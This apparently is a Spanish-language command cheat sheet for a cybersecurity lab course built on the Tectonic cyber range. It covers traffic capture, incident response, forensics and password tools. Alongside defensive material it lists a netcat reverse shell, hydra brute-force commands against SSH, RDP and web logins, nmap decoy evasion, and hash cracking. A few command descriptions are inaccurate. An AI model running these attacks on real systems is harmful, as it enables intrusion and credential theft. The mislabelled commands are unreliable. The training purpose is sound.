# Guía de Comandos Rápidos — Tectonic & Herramientas de Ciberseguridad

## Tabla de Contenidos

1. [Comandos del Ciclo de Vida de Tectonic](#1-comandos-del-ciclo-de-vida-de-tectonic)
2. [Herramientas de Análisis de Red](#2-herramientas-de-análisis-de-red)
3. [Herramientas de Respuesta a Incidentes](#3-herramientas-de-respuesta-a-incidentes)
4. [Herramientas Forenses](#4-herramientas-forenses)
5. [Herramientas de Contraseñas y Autenticación](#5-herramientas-de-contraseñas-y-autenticación)
6. [One-Liners de Python para Respuesta a Incidentes](#6-one-liners-de-python-para-respuesta-a-incidentes)

---

## 1. Comandos del Ciclo de Vida de Tectonic

### Configuración inicial

```bash
# Crear imágenes del laboratorio
tectonic -c config.ini lab_edition.yml create-images

# Desplegar el laboratorio completo
tectonic -c config.ini lab_edition.yml deploy

# Listar laboratorios desplegados
tectonic -c config.ini lab_edition.yml list

# Detener laboratorio (sin destruir)
tectonic -c config.ini lab_edition.yml stop

# Iniciar laboratorio detenido
tectonic -c config.ini lab_edition.yml start

# Acceso del estudiante (credentials, URL del portal)
tectonic -c config.ini lab_edition.yml student-access

# Acceso del profesor (panel de control)
tectonic -c config.ini lab_edition.yml teacher-access

# Destruir completamente el laboratorio
tectonic -c config.ini lab_edition.yml destroy
```

### Flujo de trabajo típico

```bash
# 1. Crear imágenes (una sola vez o tras cambios)
tectonic -c config.ini lab_edition.yml create-images

# 2. Desplegar
tectonic -c config.ini lab_edition.yml deploy

# 3. Obtener accesos
tectonic -c config.ini lab_edition.yml student-access
tectonic -c config.ini lab_edition.yml teacher-access

# 4. Al finalizar la práctica
tectonic -c config.ini lab_edition.yml destroy
```

---

## 2. Herramientas de Análisis de Red

### tcpdump

```bash
# Capturar tráfico en la interfaz eth0
tcpdump -i eth0

# Capturar solo tráfico hacia/desde una IP específica
tcpdump -i eth0 host 192.168.1.100

# Capturar tráfico en un puerto específico
tcpdump -i eth0 port 80

# Capturar tráfico TCP y guardar en archivo pcap
tcpdump -i eth0 -w captura.pcap

# Capturar con filtro combinado (puerto y red)
tcpdump -i eth0 net 192.168.1.0/24 and port 443

# Leer un archivo pcap
tcpdump -r captura.pcap

# Capturar sin resolver nombres (más rápido)
tcpdump -i eth0 -n

# Capturar paquetes completos (sin truncar)
tcpdump -i eth0 -s 0 -w captura_full.pcap

# Capturar solo paquetes SYN
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Capturar tráfico DNS
tcpdump -i eth0 port 53
```

### tshark

```bash
# Capturar tráfico en tiempo real
tshark -i eth0

# Analizar un archivo pcap
tshark -r captura.pcap

# Mostrar solo IPs origen y destino
tshark -r captura.pcap -T fields -e ip.src -e ip.dst

# Filtrar paquetes HTTP
tshark -r captura.pcap -Y "http.request"

# Extraer URLs HTTP solicitadas
tshark -r captura.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Mostrar conversaciones
tshark -r captura.pcap -z conv,ip

# Estadísticas de protocolos
tshark -r captura.pcap -z io,phs

# Filtrar por ip.addr y mostrar payload
tshark -r captura.pcap -Y "ip.addr == 10.0.0.5" -x

# Exportar paquetes filtrados a nuevo pcap
tshark -r captura.pcap -Y "tcp.port == 443" -w filtrado.pcap

# Mostrar información DNS
tshark -r captura.pcap -Y "dns" -T fields -e dns.qry.name -e dns.a

# Contar paquetes por dirección IP
tshark -r captura.pcap -z ip_hosts,tree
```

### Wireshark (filtros de display)

```
# Filtros por dirección IP
ip.addr == 192.168.1.100
ip.src == 10.0.0.5
ip.dst == 10.0.0.1

# Filtros por puerto
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Filtros por protocolo
http
dns
tcp.flags.syn == 1
tcp.flags.rst == 1

# Filtros combinados
http && ip.src == 192.168.1.100
dns && dns.qry.name contains "malicious"
tcp.port == 80 && http.request.method == "POST"

# Filtros de contenido
http contains "malware"
frame contains "password"

# Seguir un stream TCP completo
# Click derecho → Follow → TCP Stream
# (muestra toda la conversación en texto plano)

# Filtros por longitud de paquete
frame.len > 1000
frame.len < 100

# Filtros HTTP específicos
http.response.code == 200
http.request.uri contains "/admin"
http.user_agent contains "curl"

# Filtros DNS sospechosos
dns.qry.name contains ".tk"
dns.qry.len > 50
dns.flags.rcode != 0
```

### nmap

```bash
# Escaneo básico (ping sweep + puertos comunes)
nmap 192.168.1.0/24

# Escaneo de todos los puertos (1-65535)
nmap -p- 192.168.1.100

# Detección de servicios y versiones
nmap -sV 192.168.1.100

# Detección de sistema operativo
nmap -O 192.168.1.100

# Escaneo completo (servicios + OS + scripts)
nmap -A 192.168.1.100

# Escaneo sigiloso (SYN stealth)
nmap -sS 192.168.1.100

# Escaneo TCP Connect (completo, menos sigiloso)
nmap -sT 192.168.1.100

# Escaneo UDP
nmap -sU 192.168.1.100

# Escaneo con evasión de firewall
nmap -f -D RND:10 192.168.1.100

# Scripts de vulnerabilidad
nmap --script vuln 192.168.1.100

# Scripts de enumeración web
nmap --script http-enum 192.168.1.100

# Output en todos los formatos
nmap -oA resultado 192.168.1.100

# Escaneo rápido de red local
nmap -sn 192.168.1.0/24

# Escaneo de versiones con intensidad
nmap -sV --version-intensity 9 192.168.1.100
```

### netcat (nc)

```bash
# Conectar a un puerto remoto
nc 192.168.1.100 80

# Escuchar en un puerto (modo servidor)
nc -lvp 4444

# Transferir archivos (receptor)
nc -lvp 4444 > archivo_recibido.bin

# Transferir archivos (emisor)
nc 192.168.1.100 4444 < archivo_a_enviar.bin

# Banner grabbing (detectar servicio)
nc -v 192.168.1.100 80
# Luego escribir: HEAD / HTTP/1.0

# Shell inversa (uso legítimo en laboratorio)
# Receptor:
nc -lvp 4444
# Emisor:
nc 192.168.1.100 4444 -e /bin/bash

# Escanear rango de puertos
nc -zv 192.168.1.100 1-1000

# Proxy simple
mkfifo /tmp/backpipe
nc -lvp 8080 < /tmp/backpipe | nc 192.168.1.100 80 > /tmp/backpipe

# Verificar conectividad
nc -zv 192.168.1.100 22
```

---

## 3. Herramientas de Respuesta a Incidentes

### iptables

```bash
# Bloquear una IP específica
iptables -A INPUT -s 10.0.0.66 -j DROP

# Bloquear una IP con logging previo
iptables -A INPUT -s 10.0.0.66 -j LOG --log-prefix "BLOQUEADO: "
iptables -A INPUT -s 10.0.0.66 -j DROP

# Limitar tasa de conexiones (anti-DDoS)
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP

# Bloquear todo el tráfico hacia/desde una IP
iptables -A INPUT -s 10.0.0.66 -j DROP
iptables -A OUTPUT -d 10.0.0.66 -j DROP

# Permitir solo un rango de IPs
iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -j DROP

# Bloquear un puerto específico
iptables -A INPUT -p tcp --dport 23 -j DROP

# Ver reglas actuales
iptables -L -n -v

# Eliminar todas las reglas
iptables -F

# Guardar reglas
iptables-save > /etc/iptables/rules.v4

# Restaurar reglas
iptables-restore < /etc/iptables/rules.v4

# Loggear tráfico entrante
iptables -A INPUT -j LOG --log-prefix "INPUT_AUDIT: " --log-level 4
```

### ps, top, htop

```bash
# Ver todos los procesos (formato completo)
ps aux
ps -ef

# Buscar procesos específicos
ps aux | grep sshd
ps aux | grep -i "python\|perl\|bash"

# Procesos por usuario
ps -u www-data

# Procesos que consumen más CPU/memoria
ps aux --sort=-%cpu | head -20
ps aux --sort=-%mem | head -20

# Top en tiempo real (presionar 'M' para ordenar por memoria)
top

# Top con intervalo de 1 segundo y 10 iteraciones
top -d 1 -n 10

# htop (más visual, con colores)
htop

# Ver procesos con archivos abiertos
lsof -p $(pgrep nginx)

# Matar un proceso por nombre
killall malware_process
pkill -f "malicious_script"

# Ver procesos zombie
ps aux | awk '$8 ~ /Z/ {print}'
```

### ss, netstat

```bash
# Ver todas las conexiones activas
ss -tunapl

# Ver conexiones TCP establecidas
ss -tnp state established

# Ver escuchando puertos
ss -tlnp

# Ver conexiones UDP
ss -ulnp

# Ver estadísticas de conexiones
ss -s

# netstat equivalente
netstat -tunapl
netstat -tlnp
netstat -s

# Conexiones a un puerto específico
ss -tnp | grep :443

# Ver conexiones por estado
ss -tnp state time-wait
ss -tnp state close-wait

# Top 10 puertos más conectados
ss -tn | awk '{print $4}' | grep -oP ':\K[0-9]+' | sort | uniq -c | sort -rn | head -10
```

### lsof

```bash
# Ver todos los archivos abiertos por un proceso
lsof -p 1234

# Ver qué procesos tienen abierto un archivo
lsof /var/log/auth.log

# Ver conexiones de red de un proceso
lsof -i -p $(pgrep sshd)

# Ver archivos abiertos por un usuario
lsof -u www-data

# Ver procesos que usan un puerto
lsof -i :80
lsof -i :443

# Eliminar archivos eliminados que siguen abiertos
lsof | grep deleted

# Ver archivos abiertos en un directorio
lsof +D /var/log/

# Buscar archivos de tipo socket
lsof -U
```

### find, grep

```bash
# Buscar archivos modificados en las últimas 24 horas
find / -mtime -1 -type f 2>/dev/null

# Buscar archivos modificados en la última hora
find / -mmin -60 -type f 2>/dev/null

# Buscar archivos con permisos inseguros
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Buscar archivos vacíos
find / -empty -type f 2>/dev/null

# Buscar archivos con nombre sospechoso
find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null
find /tmp -type f -executable 2>/dev/null

# Buscar contenido en archivos (recursivo)
grep -r "password" /etc/ 2>/dev/null
grep -ri "suspicious_string" /var/log/ 2>/dev/null

# Buscar líneas que coincidan con un patrón en logs
grep -E "Failed|Invalid|error" /var/log/auth.log
grep -i "attack\|intrusion\|malware" /var/log/syslog

# Buscar IP específica en logs
grep -r "10.0.0.66" /var/log/

# Contar ocurrencias
grep -c "Failed password" /var/log/auth.log

# Buscar con contexto (3 líneas antes y después)
grep -B3 -A3 "SEGMENTATION" /var/log/messages

# Buscar archivos Binarios
grep -rl "MAGIC_BYTES" /suspicious/ --include="*"
```

### last, lastb

```bash
# Historial de logins exitosos
last

# Últimos 20 logins
last -20

# Historial de logins fallidos
lastb

# Logins de un usuario específico
last usuario1

# Logins desde una IP específica
last -i 192.168.1.100

# Logins desde una IP específica (fallidos)
lastb -i 10.0.0.66

# Mostrar logins activos ahora
who

# Ver who sin resolver DNS
who -u

# Ver registros de reinicio del sistema
last reboot
```

### journalctl

```bash
# Ver todos los logs del sistema
journalctl

# Logs de las últimas 24 horas
journalctl --since "24 hours ago"

# Logs de una fecha específica
journalctl --since "2024-01-15" --until "2024-01-16"

# Logs de un servicio específico
journalctl -u sshd
journalctl -u nginx

# Logs de errores
journalctl -p err

# Logs de un usuario específico
journalctl _UID=1000

# Logs del kernel
journalctl -k

# Seguir logs en tiempo real
journalctl -f

# Logs con output continuo (para análisis)
journalctl -u sshd --no-pager | tail -100

# Logs de autenticación
journalctl _COMM=sshd
journalctl _SYSTEMD_UNIT=sshd.service

# Buscar en logs
journalctl | grep -i "fail\|error\|attack"
```

---

## 4. Herramientas Forenses

### dd (creación de imágenes)

```bash
# Crear imagen de disco completo
dd if=/dev/sda of=/evidencia/disco.img bs=4M status=progress

# Crear imagen con verificación
dd if=/dev/sda of=/evidencia/disco.img bs=4M status=progress && md5sum /evidencia/disco.img > /evidencia/disco.img.md5

# Crear imagen de una partición específica
dd if=/dev/sda1 of=/evidencia/particion.img bs=4M status=progress

# Crear imagen comprimida
dd if=/dev/sda bs=4M | gzip > /evidencia/disco.img.gz

# Verificar integridad de imagen
md5sum -c /evidencia/disco.img.md5

# Crear imagen de memoria RAM
dd if=/dev/mem of=/evidencia/memoria.raw bs=1M
dd if=/proc/kcore of=/evidencia/memoria.raw bs=1M

# Bloque de disco con hash
dd if=/dev/sda of=/evidencia/cabeza512.img bs=512 count=1
```

### foremost (file carving)

```bash
# Extraer todos los tipos de archivos soportados
foremost -i /evidencia/disco.img -o /evidencia/salida/

# Extraer solo imágenes JPEG y PNG
foremost -t jpeg,png -i /evidencia/disco.img -o /evidencia/imagenes/

# Extraer solo documentos PDF
foremost -t pdf -i /evidencia/disco.img -o /evidencia/documentos/

# Extraer todos los archivos con verbose
foremost -v -i /evidencia/disco.img -o /evidencia/salida/

# Usar config custom
foremost -c /ruta/a/config.txt -i disco.img -o salida/

# Extraer de una imagen comprimida
gunzip -c disco.img.gz | foremost -i - -o /evidencia/salida/
```

### strings (extraer texto de binarios)

```bash
# Extraer strings ASCII
strings /bin/suspicious

# Extraer strings Unicode (16-bit)
strings -e l /bin/suspicious

# Extraer strings de un binario y guardar
strings /bin/suspicious > /evidencia/strings_extraidos.txt

# Extraer strings mínimos de 10 caracteres
strings -n 10 /bin/suspicious

# Buscar IPs en strings
strings disco.img | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u

# Buscar URLs
strings disco.img | grep -i "http\|https\|ftp"

# Buscar emails
strings disco.img | grep -iE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Buscar hashes conocidos
strings disco.img | grep -E '^[a-f0-9]{32}$|^[a-f0-9]{40}$|^[a-f0-9]{64}$'
```

### file (identificar tipos de archivo)

```bash
# Identificar tipo de archivo
file archivo_sospechoso

# Identificar tipo real (ignorar extensión)
file -b archivo.pdf

# Identificar todos los archivos en un directorio
file /evidencia/salida/*

# Buscar archivos con extensión engañosa
find /evidencia/salida/ -exec file {} \; | grep -v "PNG image\|JPEG\|PDF"

# Identificar tipo con mime
file --mime-type archivo_desconocido

# Identificar archivos con magic bytes específicos
file -f /evidencia/salida/*
```

### md5sum / sha256sum (hashing)

```bash
# Calcular hash MD5
md5sum /evidencia/disco.img

# Calcular hash SHA-256
sha256sum /evidencia/disco.img

# Guardar hashes de un directorio
find /evidencia/ -type f -exec sha256sum {} \; > /evidencia/hashes.txt

# Verificar integridad de hashes
sha256sum -c /evidencia/hashes.txt

# Calcular hash de un bloque de disco
dd if=/dev/sda bs=512 count=1 | md5sum

# Hash de un archivo comprimido
zcat archivo.gz | md5sum

# Hash de múltiples archivos
md5sum /evidencia/evidencia1.img /evidencia/evidencia2.img
```

### Volatility3 (análisis de memoria)

```bash
# Identificar perfil del SO
volatility3 -f memoria.raw windows.info

# Listar procesos
volatility3 -f memoria.raw windows.pslist

# Listar procesos con árbol de-padre
volatility3 -f memoria.raw windows.pstree

# Listar procesos con cmdlines
volatility3 -f memoria.raw windows.cmdline

# Ver conexiones de red
volatility3 -f memoria.raw windows.netscan

# Ver archivos abiertos
volatility3 -f memoria.raw windows.handles

# Extraer un proceso específico por PID
volatility3 -f memoria.raw windows.memmap --pid 1234 --dump

# Ver historial de comandos
volatility3 -f memoria.raw windows.cmdline

# Buscar strings en memoria
volatility3 -f memoria.raw windows.strings

# Ver DLLs cargados
volatility3 -f memoria.raw windows.dlllist

# Extraer procesos sospechosos
volatility3 -f memoria.raw windows.pslist | grep -i "suspicious"

# Ver eventos de registro
volatility3 -f memoria.raw windows.registry.hivelist

# Ver entradas de autostart
volatility3 -f memoria.raw windows.registry.autorun

# MFT (Master File Table)
volatility3 -f memoria.raw windows.mftscan

# Ver archivos eliminados
volatility3 -f memoria.raw windows.filescan | grep "DELETED"
```

### Sleuth Kit (TSK)

```bash
# Listar archivos del sistema de archivos (incluyendo eliminados)
fls -r /evidencia/disco.img

# Listar archivos en una partición específica
fls -r -o 2048 /evidencia/disco.img

# Extraer un archivo específico por inode
icat /evidencia/disco.img 12345 > /evidencia/archivo_extraido.txt

# Verificar inodo
icat /evidencia/disco.img 12345 | md5sum

# Listar particiones del disco
mmls /evidencia/disco.img

# Listar archivos en NTFS
fls -r -f ntfs /evidencia/disco.img

# Ver metadatos de un archivo
istat /evidencia/disco.img 12345

# Buscar archivos por nombre
ffind /evidencia/disco.img -name "password*"

# Timeline de actividad del sistema
fls -r -m "/" /evidencia/disco.img | mactime -b - -d > /evidencia/timeline.csv

# Extraer contenido de archivo NTFS
tsk_recover /evidencia/disco.img /evidencia/recuperados/
```

---

## 5. Herramientas de Contraseñas y Autenticación

### hydra (brute force)

```bash
# Fuerza bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Fuerza bruta FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Fuerza bruta HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Fuerza bruta con usuario específico
hydra -l usuario -P /usr/share/wordlists/rockyou.txt 192.168.1.100 telnet

# Fuerza bruta RDP
hydra -l administrator -P passwords.txt 192.168.1.100 rdp

# Fuerza bruta con 4 hilos
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Fuerza bruta MySQL
hydra -l root -P passwords.txt 192.168.1.100 mysql

# Usar lista de usuarios
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Mostrar intentos fallidos
hydra -l admin -P passwords.txt -V ssh://192.168.1.100

# Guardar resultados
hydra -l admin -P passwords.txt -o resultados.txt ssh://192.168.1.100
```

### john (John the Ripper)

```bash
# Crackear un hash MD5
john --format=raw-md5 hashes.txt

# Crackear un hash SHA-256
john --format=raw-sha256 hashes.txt

# Crackear un hash de Linux (/etc/shadow)
john shadow.txt

# Crackear con wordlist específico
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar resultados
john --show hashes.txt

# Crackear con reglas
john --rules --wordlist=wordlist.txt hashes.txt

# Crackear hash NTLM
john --format=nt hashes.txt

# Crackear hashes de WordPress
john --format=phpass hashes.txt

# Crackear con incremental mode
john --incremental hashes.txt

# Crear hash para testing
echo -n "password123" | md5sum | cut -d' ' -f1 > test.hash

# Ver formato de hash soportado
john --list=formats | grep -i md5

# Crackear hashes con potencia GPU
john --format=raw-sha256 --fork=4 hashes.txt
```

### hashcat

```bash
# Crackear MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crackear SHA-256
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# Crackear NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crackear con fuerza bruta (8 caracteres)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Crackear con reglas
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Modo dictionary
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Mostrar crackeados
hashcat -m 0 hashes.txt --show

# Ver info del sistema
hashcat -I

# Benchmark
hashcat -b

# Crackear hash de WordPress (phpass)
hashcat -m 400 hashes.txt wordlist.txt

# Crackear SHA-512 de Linux
hashcat -m 1800 hashes.txt wordlist.txt

# Ver progreso
hashcat -m 0 hashes.txt --status

# Forzar salida
hashcat -m 0 hashes.txt wordlist.txt --outfile=resultado.txt
```

---

## 6. One-Liners de Python para Respuesta a Incidentes

### Servidor HTTP simple

```bash
# Servir archivos desde el directorio actual (Python 3)
python3 -m http.server 8080

# Servir archivos en un puerto específico
python3 -m http.server 8080 --bind 0.0.0.0

# Servir directorio específico
python3 -m http.server 8080 --directory /ruta/a/evidencias/

# Servidor HTTPS con certificado
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')
server.socket = ctx.wrap_socket(server.socket, server_side=True)
server.serve_forever()
"
```

### Transferencia de archivos

```bash
# Descargar archivo con Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.0.0.1/evidencia.img', 'evidencia.img')"

# Subir archivo
python3 -c "
import http.server, cgi, os
class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        file = form['file']
        with open(os.path.join('/tmp', file.filename), 'wb') as f:
            f.write(file.file.read())
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
"
```

### Base64 encode/decode

```bash
# Codificar a base64
echo -n "texto secreto" | base64

# Decodificar de base64
echo "dGV4dG8gc2VjcmV0bw==" | base64 -d

# Codificar archivo
base64 archivo.bin > archivo.b64

# Decodificar archivo
base64 -d archivo.b64 > archivo_original.bin

# Codificar con Python
python3 -c "import base64; print(base64.b64encode(b'texto').decode())"

# Decodificar con Python
python3 -c "import base64; print(base64.b64decode('dGV4dG8=').decode())"
```

### Análisis rápido de logs

```bash
# Extraer IPs únicas de un log
cat /var/log/auth.log | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u

# Contar intentos fallidos por IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Top 10 IPs más activas
cat /var/log/auth.log | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -rn | head -10

# Filtrar logs por fecha específica
awk '/Jan 15/ {print}' /var/log/auth.log

# Buscar patrones sospechosos en logs
grep -iE "fail|error|invalid|refused|attack" /var/log/syslog | tail -50

# Generar hash de evidencia
find /evidencia/ -type f -exec sha256sum {} \; > /tmp/hashes_evidencia.txt
```

### Herramientas de red con Python

```bash
# Escaneo rápido de puertos con Python
python3 -c "
import socket
for port in [21,22,23,25,53,80,443,3306,3389,8080]:
    s = socket.socket()
    s.settimeout(1)
    try:
        s.connect(('192.168.1.100', port))
        print(f'Puerto {port}: ABIERTO')
    except: pass
    finally: s.close()
"

# Crear un sniffer simple con Python
python3 -c "
from scapy.all import sniff
pkts = sniff(filter='tcp port 80', count=100)
for p in pkts:
    print(p.summary())
"

# Verificar integridad de archivos
python3 -c "
import hashlib, os
for f in os.listdir('/evidencia/'):
    h = hashlib.sha256(open(f'/evidencia/{f}','rb').read()).hexdigest()
    print(f'{h}  {f}')
"
```

### Respuesta rápida a incidentes

```bash
# Crear copia de seguridad rápida del sistema
tar czf /tmp/backup_$(date +%Y%m%d_%H%M%S).tar.gz /etc/ /var/log/ /home/

# Monitorear procesos en tiempo real
watch -n 1 'ps aux --sort=-%cpu | head -20'

# Buscar procesos que abren conexiones de red
ss -tlnp | grep -v "127.0.0.1"

# Verificar cron sospechosos
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Buscar archivos con permisos SUID/SGID
find / -perm -4000 -o -perm -2000 2>/dev/null | while read f; do echo "$(stat -c '%U %G %a' "$f") $f"; done

# Verificar servicios en ejecución
systemctl list-units --type=service --state=running

# Verificar usuarios con UID 0 (solo root debería tenerlo)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Verificar archivos modificados recientemente
find / -mmin -30 -type f 2>/dev/null | head -50
```

---

## Referencias Rápidas

| Herramienta | Uso principal |
|---|---|
| `tcpdump` | Captura de tráfico |
| `tshark` | Análisis CLI de tráfico |
| `Wireshark` | Análisis GUI de tráfico |
| `nmap` | Escaneo de red |
| `netcat` | Conexiones raw |
| `iptables` | Reglas de firewall |
| `hydra` | Fuerza bruta |
| `john` | Cracking de hashes |
| `hashcat` | Cracking GPU |
| `Volatility3` | Análisis de memoria |
| `Sleuth Kit` | Análisis de disco |
| `foremost` | File carving |
| `dd` | Imágenes de disco |

---

*Guía rápida para el Curso de Tectonic — BHU Ciberseguridad*
*Última actualización: 2026*
